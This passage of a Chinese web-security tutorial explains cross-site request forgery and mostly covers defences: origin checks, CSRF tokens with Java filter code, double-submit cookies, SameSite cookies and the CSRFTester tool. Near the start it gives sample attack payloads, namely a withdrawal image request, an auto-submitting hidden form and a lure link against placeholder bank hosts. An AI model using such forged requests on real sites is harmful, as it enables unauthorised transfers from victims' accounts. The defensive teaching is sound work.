class="headerlink" title="几种常见的攻击类型"></a>几种常见的攻击类型</h3><p><strong>GET类型的CSRF</strong></p><p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p><p><strong>POST类型的CSRF</strong></p><p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.example/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p><p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。</p><p><strong>链接类型的CSRF</strong></p><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">重磅消息！！</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。</p><h3 id="CSRF的特点"><a href="#CSRF的特点" class="headerlink" title="CSRF的特点"></a>CSRF的特点</h3><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li><li>跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li></ul><p>CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</p><h2 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h2><p>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。</p><p>上文中讲了CSRF的两个特点：</p><ul><li>CSRF（通常）发生在第三方域名。</li><li>CSRF攻击者不能获取到Cookie等信息，只是使用。</li></ul><p>针对这两点，我们可以专门制定防护策略，如下：</p><ul><li>阻止不明外域的访问<ul><li>同源检测</li><li>Samesite Cookie</li></ul></li><li>提交时要求附加本域才能获取的信息<ul><li>CSRF Token</li><li>双重Cookie验证</li></ul></li></ul><p>以下我们对各种防护方法做详细说明。</p><h3 id="同源检测"><a href="#同源检测" class="headerlink" title="同源检测"></a>同源检测</h3><p>既然CSRF大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。</p><p>那么问题来了，我们如何判断请求是否来自外域呢？</p><p>在HTTP协议中，每一个异步请求都会携带两个Header，用于标记来源域名：</p><ul><li>Origin Header</li><li>Referer Header</li></ul><p>这两个Header在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个Header中的域名，确定请求的来源域。</p><h4 id="使用Origin-Header确定来源域名"><a href="#使用Origin-Header确定来源域名" class="headerlink" title="使用Origin Header确定来源域名"></a>使用Origin Header确定来源域名</h4><p>在部分与CSRF有关的请求中，请求的Header中会携带Origin字段。字段内包含请求的域名（不包含path及query）。</p><p>如果Origin存在，那么直接使用Origin中的字段确认来源域名就可以。</p><p>但是Origin在以下两种情况下并不存在：</p><ul><li><strong>IE11同源策略：</strong> IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#IE_Exceptions">MDN Same-origin_policy#IE_Exceptions</a></li><li><strong>302重定向：</strong> 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。</li></ul><h4 id="使用Referer-Header确定来源域名"><a href="#使用Referer-Header确定来源域名" class="headerlink" title="使用Referer Header确定来源域名"></a>使用Referer Header确定来源域名</h4><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，记录了该HTTP请求的来源地址。 对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。</p><p>这种方法并非万无一失，Referer的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的Referer。</p><p>2014年，W3C的Web应用安全工作组发布了Referrer Policy草案，对浏览器该如何发送Referer做了详细的规定。截止现在新版浏览器大部分已经支持了这份草案，我们终于可以灵活地控制自己网站的Referer策略了。新版的Referrer Policy规定了五种Referer策略：No Referrer、No Referrer When Downgrade、Origin Only、Origin When Cross-origin、和 Unsafe URL。之前就存在的三种策略：never、default和always，在新标准里换了个名称。他们的对应关系如下：</p><table><thead><tr><th align="left">策略名称</th><th align="left">属性值（新）</th><th align="left">属性值（旧）</th></tr></thead><tbody><tr><td align="left">No Referrer</td><td align="left">no-Referrer</td><td align="left">never</td></tr><tr><td align="left">No Referrer When Downgrade</td><td align="left">no-Referrer-when-downgrade</td><td align="left">default</td></tr><tr><td align="left">Origin Only</td><td align="left">(same or strict) origin</td><td align="left">origin</td></tr><tr><td align="left">Origin When Cross Origin</td><td align="left">(strict) origin-when-crossorigin</td><td align="left">-</td></tr><tr><td align="left">Unsafe URL</td><td align="left">unsafe-url</td><td align="left">always</td></tr></tbody></table><p>根据上面的表格因此需要把Referrer Policy的策略设置成same-origin，对于同源的链接和引用，会发送Referer，referer值为Host不带Path；跨域访问则不携带Referer。例如：<code>aaa.com</code>引用<code>bbb.com</code>的资源，不会发送Referer。</p><p>设置Referrer Policy的方法有三种：</p><ol><li>在CSP设置</li><li>页面头部增加meta标签</li><li>a标签增加referrerpolicy属性</li></ol><p>上面说的这些比较多，但我们可以知道一个问题：攻击者可以在自己的请求中隐藏Referer。如果攻击者将自己的请求这样填写：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker)</span><br></pre></td></tr></table></figure><p>那么这个请求发起的攻击将不携带Referer。</p><p>另外在以下情况下Referer没有或者不可信：</p><ol><li>IE6、7下使用window.location.href=url进行界面的跳转，会丢失Referer。</li><li>IE6、7下使用window.open，也会缺失Referer。</li><li>HTTPS页面跳转到HTTP页面，所有浏览器Referer都丢失。</li><li>点击Flash上到达另外一个网站的时候，Referer的情况就比较杂乱，不太可信。</li></ol><h4 id="无法确认来源域名情况"><a href="#无法确认来源域名情况" class="headerlink" title="无法确认来源域名情况"></a>无法确认来源域名情况</h4><p>当Origin和Referer头文件不存在时该怎么办？如果Origin和Referer都不存在，建议直接进行阻止，特别是如果您没有使用随机CSRF Token（参考下方）作为第二次检查。</p><h4 id="如何阻止外域请求"><a href="#如何阻止外域请求" class="headerlink" title="如何阻止外域请求"></a>如何阻止外域请求</h4><p>通过Header的验证，我们可以知道发起请求的来源域名，这些来源域名可能是网站本域，或者子域名，或者有授权的第三方域名，又或者来自不可信的未知域名。</p><p>我们已经知道了请求域名是否是来自不可信的域名，我们直接阻止掉这些的请求，就能防御CSRF攻击了吗？</p><p>且慢！当一个请求是页面请求（比如网站的主页），而来源是搜索引擎的链接（例如百度的搜索结果），也会被当成疑似CSRF攻击。所以在判断的时候需要过滤掉页面请求情况，通常Header符合以下情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept: text&#x2F;html</span><br><span class="line">Method: GET</span><br></pre></td></tr></table></figure><p>但相应的，页面请求就暴露在了CSRF的攻击范围之中。如果你的网站中，在页面的GET请求中对当前用户做了什么操作的话，防范就失效了。</p><p>例如，下面的页面请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:&#x2F;&#x2F;example.com&#x2F;addComment?comment&#x3D;XXX&amp;dest&#x3D;orderId</span><br></pre></td></tr></table></figure><p>注：这种严格来说并不一定存在CSRF攻击的风险，但仍然有很多网站经常把主文档GET请求挂上参数来实现产品功能，但是这样做对于自身来说是存在安全风险的。</p><p>另外，前面说过，CSRF大多数情况下来自第三方域名，但并不能排除本域发起。如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。</p><p>综上所述：同源验证是一个相对简单的防范方法，能够防范绝大多数的CSRF攻击。但这并不是万无一失的，对于安全性要求较高，或者有较多用户输入内容的网站，我们就要对关键的接口做额外的防护措施。</p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>前面讲到CSRF的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用Cookie中的信息。</p><p>而CSRF攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>CSRF Token的防护策略分为三个步骤：</p><p><strong>1. 将CSRF Token输出到页面中</strong></p><p>首先，用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p><p><strong>2. 页面提交的请求携带这个Token</strong></p><p>对于GET请求，Token将附在请求地址之后，这样URL 就变成 <a href="http://url/?csrftoken=tokenvalue%E3%80%82">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”hidden”</span> <span class="attr">name</span>=<span class="string">”csrftoken”</span> <span class="attr">value</span>=<span class="string">”tokenvalue”/</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样，就把Token以参数的形式加入请求了。</p><p><strong>3. 服务器验证Token是否正确</strong></p><p>当用户从客户端得到了Token，再次提交给服务器的时候，服务器需要判断Token的有效性，验证过程是先解密Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个Token就是有效的。</p><p>这种方法要比之前检查Referer或者Origin要安全一些，Token可以在产生并放于Session之中，然后在每次请求时把Token从Session中拿出，与请求中的Token进行比对，但这种方法的比较麻烦的在于如何把Token以参数的形式加入请求。</p><p>下面将以Java为例，介绍一些CSRF Token的服务端校验逻辑，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HttpServletRequest req = (HttpServletRequest)request; </span><br><span class="line">HttpSession s = req.getSession(); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从 session 中得到 csrftoken 属性</span></span><br><span class="line">String sToken = (String)s.getAttribute(“csrftoken”); </span><br><span class="line"><span class="keyword">if</span>(sToken == <span class="keyword">null</span>)&#123; </span><br><span class="line">   <span class="comment">// 产生新的 token 放入 session 中</span></span><br><span class="line">   sToken = generateToken(); </span><br><span class="line">   s.setAttribute(“csrftoken”,sToken); </span><br><span class="line">   chain.doFilter(request, response); </span><br><span class="line">&#125; <span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="comment">// 从 HTTP 头中取得 csrftoken </span></span><br><span class="line">   String xhrToken = req.getHeader(“csrftoken”); </span><br><span class="line">   <span class="comment">// 从请求参数中取得 csrftoken </span></span><br><span class="line">   String pToken = req.getParameter(“csrftoken”); </span><br><span class="line">   <span class="keyword">if</span>(sToken != <span class="keyword">null</span> &amp;&amp; xhrToken != <span class="keyword">null</span> &amp;&amp; sToken.equals(xhrToken))&#123; </span><br><span class="line">       chain.doFilter(request, response); </span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sToken != <span class="keyword">null</span> &amp;&amp; pToken != <span class="keyword">null</span> &amp;&amp; sToken.equals(pToken))&#123; </span><br><span class="line">       chain.doFilter(request, response); </span><br><span class="line">   &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">       request.getRequestDispatcher(“error.jsp”).forward(request,response); </span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码源自<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/">IBM developerworks CSRF</a></p><p>这个Token的值必须是随机生成的，这样它就不会被攻击者猜到，考虑利用Java应用程序的java.security.SecureRandom类来生成足够长的随机标记，替代生成算法包括使用256位BASE64编码哈希，选择这种生成算法的开发人员必须确保在散列数据中使用随机性和唯一性来生成随机标识。通常，开发人员只需为当前会话生成一次Token。在初始生成此Token之后，该值将存储在会话中，并用于每个后续请求，直到会话过期。当最终用户发出请求时，服务器端必须验证请求中Token的存在性和有效性，与会话中找到的Token相比较。如果在请求中找不到Token，或者提供的值与会话中的值不匹配，则应中止请求，应重置Token并将事件记录为正在进行的潜在CSRF攻击。</p><h4 id="分布式校验"><a href="#分布式校验" class="headerlink" title="分布式校验"></a>分布式校验</h4><p>在大型网站中，使用Session存储CSRF Token会带来很大的压力。访问单台服务器session是同一个。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房都可能在不同的省份，用户发起的HTTP请求通常要经过像Ngnix之类的负载均衡器之后，再路由到具体的服务器上，由于Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。</p><p>由于使用Session存储，读取和验证CSRF Token会引起比较大的复杂度和性能问题，目前很多网站采用Encrypted Token Pattern方式。这种方法的Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。</p><p>这种Token的值通常是使用UserID、时间戳和随机数，通过加密的方法生成。这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。</p><p>在token解密成功之后，服务器可以访问解析值，Token中包含的UserID和时间戳将会被拿来被验证有效性，将UserID与当前登录的UserID进行比较，并将时间戳与当前时间进行比较。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功。</p><p>但是此方法的实现比较复杂，需要给每一个页面都写入Token（前端无法使用纯静态页面），每一个Form及Ajax请求都携带这个Token，后端对每一个接口都进行校验，并保证页面Token及请求Token一致。这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏。</p><blockquote><p>验证码和密码其实也可以起到CSRF Token的作用哦，而且更安全。</p><p>为什么很多银行等网站会要求已经登录的用户在转账时再次输入密码，现在是不是有一定道理了？</p></blockquote><h3 id="双重Cookie验证"><a href="#双重Cookie验证" class="headerlink" title="双重Cookie验证"></a>双重Cookie验证</h3><p>在会话中存储CSRF Token比较繁琐，而且不能在通用的拦截上统一处理所有的接口。</p><p>那么另一种防御措施是使用双重提交Cookie。利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。</p><p>双重Cookie采用以下流程：</p><ul><li>在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如<code>csrfcookie=v8g9e4ksfhw</code>）。</li><li>在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例<code>POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw</code>）。</li><li>后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。</li></ul><p>此方法相对于CSRF Token就简单了许多。可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储Token。</p><p>当然，此方法并没有大规模应用，其在大型网站上的安全性还是没有CSRF Token高，原因我们举例进行说明。</p><p>由于任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间），于是发生了如下情况：</p><ul><li>如果用户访问的网站为<code>www.a.com</code>，而后端的api域名为<code>api.a.com</code>。那么在<code>www.a.com</code>下，前端拿不到<code>api.a.com</code>的Cookie，也就无法完成双重Cookie认证。</li><li>于是这个认证Cookie必须被种在<code>a.com</code>下，这样每个子域都可以访问。</li><li>任何一个子域都可以修改<code>a.com</code>下的Cookie。</li><li>某个子域名存在漏洞被XSS攻击（例如<code>upload.a.com</code>）。虽然这个子域下并没有什么值得窃取的信息。但攻击者修改了<code>a.com</code>下的Cookie。</li><li>攻击者可以直接使用自己配置的Cookie，对XSS中招的用户再向<code>www.a.com</code>下，发起CSRF攻击。</li></ul><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p><strong>用双重Cookie防御CSRF的优点：</strong></p><ul><li>无需使用Session，适用面更广，易于实施。</li><li>Token储存于客户端中，不会给服务器带来压力。</li><li>相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。</li></ul><p><strong>缺点：</strong></p><ul><li>Cookie中增加了额外的字段。</li><li>如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。</li><li>难以做到子域名的隔离。</li><li>为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。</li></ul><h3 id="Samesite-Cookie属性"><a href="#Samesite-Cookie属性" class="headerlink" title="Samesite Cookie属性"></a>Samesite Cookie属性</h3><p>防止CSRF攻击的办法已经有上面的预防措施。为了从源头上解决这个问题，Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解：</p><h4 id="Samesite-Strict"><a href="#Samesite-Strict" class="headerlink" title="Samesite=Strict"></a>Samesite=Strict</h4><p>这种称为严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。比如说 b.com 设置了如下 Cookie：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo=1; Samesite=Strict</span><br><span class="line">Set-Cookie: bar=2; Samesite=Lax</span><br><span class="line">Set-Cookie: baz=3</span><br></pre></td></tr></table></figure><p>我们在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。</p><h4 id="Samesite-Lax"><a href="#Samesite-Lax" class="headerlink" title="Samesite=Lax"></a>Samesite=Lax</h4><p>这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。比如说 b.com设置了如下Cookie：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo=1; Samesite=Strict</span><br><span class="line">Set-Cookie: bar=2; Samesite=Lax</span><br><span class="line">Set-Cookie: baz=3</span><br></pre></td></tr></table></figure><p>当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。</p><p>生成Token放到Cookie中并且设置Cookie的Samesite，Java代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addTokenCookieAndHeader</span><span class="params">(HttpServletRequest httpRequest, HttpServletResponse httpResponse)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//生成token</span></span><br><span class="line">       String sToken = <span class="keyword">this</span>.generateToken();</span><br><span class="line">       <span class="comment">//手动添加Cookie实现支持“Samesite=strict”</span></span><br><span class="line">       <span class="comment">//Cookie添加双重验证</span></span><br><span class="line">       String CookieSpec = String.format(<span class="string">&quot;%s=%s; Path=%s; HttpOnly; Samesite=Strict&quot;</span>, <span class="keyword">this</span>.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI());</span><br><span class="line">       httpResponse.addHeader(<span class="string">&quot;Set-Cookie&quot;</span>, CookieSpec);</span><br><span class="line">       httpResponse.setHeader(CSRF_TOKEN_NAME, token);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>代码源自<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#Implementation_example">OWASP Cross-Site_Request_Forgery #Implementation example</a></p><h4 id="我们应该如何使用SamesiteCookie"><a href="#我们应该如何使用SamesiteCookie" class="headerlink" title="我们应该如何使用SamesiteCookie"></a>我们应该如何使用SamesiteCookie</h4><p>如果SamesiteCookie被设置为Strict，浏览器在任何跨域请求中都不会携带Cookie，新标签重新打开也不携带，所以说CSRF攻击基本没有机会。</p><p>但是跳转子域名或者是新标签重新打开刚登陆的网站，之前的Cookie都不会存在。尤其是有登录的网站，那么我们新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录。对于用户来讲，可能体验不会很好。</p><p>如果SamesiteCookie被设置为Lax，那么其他网站通过页面跳转过来的时候可以使用Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。</p><p>另外一个问题是Samesite的兼容性不是很好，现阶段除了从新版Chrome和Firefox支持以外，Safari以及iOS Safari都还不支持，现阶段看来暂时还不能普及。</p><p>而且，SamesiteCookie目前有一个致命的缺陷：不支持子域。例如，种在topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。</p><p>总之，SamesiteCookie是一个可能替代同源验证的方案，但目前还并不成熟，其应用场景有待观望。</p><h2 id="防止网站被利用"><a href="#防止网站被利用" class="headerlink" title="防止网站被利用"></a>防止网站被利用</h2><p>前面所说的，都是被攻击的网站如何做好防护。而非防止攻击的发生，CSRF的攻击可以来自：</p><ul><li>攻击者自己的网站。</li><li>有文件上传漏洞的网站。</li><li>第三方论坛等用户内容。</li><li>被攻击网站自己的评论功能等。</li></ul><p>对于来自黑客自己的网站，我们无法防护。但对其他情况，那么如何防止自己的网站被利用成为攻击的源头呢？</p><ul><li>严格管理所有的上传接口，防止任何预期之外的上传内容（例如HTML）。</li><li>添加Header <code>X-Content-Type-Options: nosniff</code> 防止黑客上传HTML内容的资源（例如图片）被解析为网页。</li><li>对于用户上传的图片，进行转存或者校验。不要直接使用用户填写的图片链接。</li><li>当前用户打开其他用户填写的链接时，需告知风险（这也是很多论坛不允许直接在内容中发布外域链接的原因之一，不仅仅是为了用户留存，也有安全考虑）。</li></ul><h2 id="CSRF其他防范措施"><a href="#CSRF其他防范措施" class="headerlink" title="CSRF其他防范措施"></a>CSRF其他防范措施</h2><p>对于一线的程序员同学，我们可以通过各种防护策略来防御CSRF，对于QA、SRE、安全负责人等同学，我们可以做哪些事情来提升安全性呢？</p><h3 id="CSRF测试"><a href="#CSRF测试" class="headerlink" title="CSRF测试"></a>CSRF测试</h3><p>CSRFTester是一款CSRF漏洞的测试工具，CSRFTester工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。 CSRFTester使用方法大致分下面几个步骤：</p><p><strong>步骤1：设置浏览器代理</strong></p><p>CSRFTester默认使用Localhost上的端口8008作为其代理，如果代理配置成功，CSRFTester将为您的浏览器生成的所有后续HTTP请求生成调试消息。</p><p><strong>步骤2：使用合法账户访问网站开始测试</strong></p><p>我们需要找到一个我们想要为CSRF测试的特定业务Web页面。找到此页面后，选择CSRFTester中的“开始录制”按钮并执行业务功能；完成后，点击CSRFTester中的“停止录制”按钮；正常情况下，该软件会全部遍历一遍当前页面的所有请求。</p><p><strong>步骤3：通过CSRF修改并伪造请求</strong></p><p>之后，我们会发现软件上有一系列跑出来的记录请求，这些都是我们的浏览器在执行业务功能时生成的所有GET或者POST请求。通过选择列表中的某一行，我们现在可以修改用于执行业务功能的参数，可以通过点击对应的请求修改query和form的参数。当修改完所有我们希望诱导用户form最终的提交值，可以选择开始生成HTML报告。</p><p><strong>步骤4：拿到结果如有漏洞进行修复</strong></p><p>首先必须选择“报告类型”。报告类型决定了我们希望受害者浏览器如何提交先前记录的请求。目前有5种可能的报告：表单、iFrame、IMG、XHR和链接。一旦选择了报告类型，我们可以选择在浏览器中启动新生成的报告，最后根据报告的情况进行对应的排查和修复。</p><h3 id="CSRF监控"><a href="#CSRF监控" class="headerlink" 